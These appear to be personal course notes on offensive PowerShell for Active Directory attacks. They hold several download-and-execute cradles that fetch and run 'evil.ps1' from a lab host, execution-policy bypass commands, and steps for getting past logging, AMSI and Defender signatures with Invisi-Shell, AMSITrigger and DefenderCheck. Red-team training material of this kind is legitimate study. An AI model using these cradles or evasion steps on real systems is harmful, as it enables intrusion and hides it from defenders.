#### PowerShell
- "PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework."
- PowerShell comes installed by-default on all the modern Windows OS.
- PowerShell is NOT powershell.exe. It is the System.Management.Automation.dll
- We will use Windows PowerShell. There is a platform independent PowerShell Core as well.

#### PowerShell Scripts and Modules
- Load a PowerShell script using dot sourcing:
	- `. C:\AD\Tools\PowerView.ps1`
- A module (or a script) can be imported with:
	- `Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
- All the commands in a module can be listed with:
	- `Get-Command -Module <modulename>`

#### PowerShell Script Execution
- Download execute cradle:
	- `iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
	- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
- PSv3 onwards:
	- `iex (iwr 'http://192.168.230.1/evil.ps1')`
	- `$h=New-Object -ComObject`
	  `Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex`
	  `$h.responseText`
	- `$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")`
	  `$r = $wr.GetResponse()`
	  `IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

#### PowerShell Detections
- System-wide transcription
	- System-wide transcription is not enabled by default, and requires configuration OOTB
	- Not very widely adopted, but exists theoretically
	- Organisations started to block powershell.exe, so attackers started utilising custom runspaces, for example, they would load the powershell DLL from unmanaged core, in which case even if powershell.exe was blocked, attackers would still be able to run PowerShell commands or scripts on the system.
	- System-wide transcription logs PowerShell commands and their outputs system-wide, regardless of the host used to run them.
	- However the logging is in a clear-text format, as an unprotected log, if the logs directory is specified for example as `C:/transcripts`, anybody with access to the system can view the logs.
	- Any credentials used on the CLI, or fetched from remote on the CLI would be logged in clear-text as well, without protecting the secrets.
- Script Block logging
	- Script Block logging is enabled by default
	- There are two types of Script Block logging:
		- 4103 (Warning Level)
		- 4104 (Verbose)
	- Script Block logging logs any suspicious script blocks
	- More of a nuisance than an actual security control
- AntiMalware Scan Interface (AMSI)
	- AMSI facilitates detection not only for Windows scripts like PowerShell, JS or VBS, but also for .NET and Macros.
	- Right before the execution of a script, AMSI steps in, picks the content of a script and sends it to the machine's registered AV for signature based detection.
- Constrained Language Mode (CLM)
	- CLM prevents us from doing much "fun" stuff
	- From all the PowerShell tools we will discuss, only Microsoft's own AD module works under CLM, all other tools stop working
	- Integrated with Applocker and WDAC (Windows Defender Application Control) - Device Guard
	- If any restriction exists on the execution of scripts anywhere on the machine, Windows PowerShell 5.1 will relegate itself to the Constrained Language Mode
	- There are 4 language modes:
		- No Language Mode
			- Used by JEA (Just Enough Administration), which is a sandboxed PowerShell remote session that is designed to strictly limit what the logged on user can do.
		- Constrained Language Mode
		- Restricted Language Mode
		- Full Language Mode

#### Execution Policy
- It is NOT a security measure, it is present to prevent user from accidently executing scripts.
- Several ways to bypass:
	- `powershell -ExecutionPolicy bypass`
	- `powershell -c <cmd>`
	- `powershell -encodedcommand`
	- `$env:PSExecutionPolicyPreference="bypass"`
![[Pasted image 20250320191426.png]]

#### PowerShell Tradecraft
- Offensive PowerShell is not dead.
- The detections depend on your target organization and if you are using customized code.
- There are bypasses and then there are obfuscated bypasses!
- Remember, the focus of the class is Active Directory :)

#### Bypassing PowerShell Security
##### Invisi-Shell (https://github.com/OmerYa/Invisi-Shell)
- We will use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.
- The tool hooks the .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging
- It uses a CLR Profiler API to perform the hook.
- "A common language runtime (CLR) profiler is a dynamic link library (DLL) that consists of functions that receive messages from, and send messages to, the CLR by using the profiling API. The profiler DLL is loaded by the CLR at run time."
- Invisi-Shell can bypass:
	- System-wide transcription
	- Script Block logging
	- AntiMalware Scan Interface (AMSI)
- Using Invisi-Shell:
	- With admin privileges: `RunWithPathAsAdmin.bat`
	- With non-admin privileges: `RunWithRegistryNonAdmin.bat`
	- Type `exit` from the new PowerShell session to complete the clean-up.

#### Bypassing AV Signatures for PowerShell
- We can always load scripts in memory and avoid detection using AMSI bypass.
- How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?
- ##### AMSITrigger (https://github.com/RythmStick/AMSITrigger) and DefenderCheck (https://github.com/t3hbb/DefenderCheck)
	- We can use AMSITrigger or DefenderCheck to identify code and strings from a binary or script that Windows Defender may flag.
	- Simply provide path to the script file to scan it:
		- `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
		- `DefenderCheck.exe PowerUp.ps1`
	- Steps to avoid signature based detection are pretty simple:
		1. Scan using AMSITrigger
		2. Modify the detected code snippet
		3. Rescan using AMSITrigger
		4. Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”
	- Some more tips to avoid signature based detection:
		- Using only the minimal portion of a script is also useful.
		- We can remove the part of a script that is getting detected but is not used.
		- For this we can scan the script with DefenderCheck and then use the ByteToLineNumber.ps1 script in the C:\AD\Tools folder.
- ##### Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
	- For full obfuscation of PowerShell scripts, see Invoke-Obfuscation.
	- It is used for obfuscating the AMSI bypass in the course!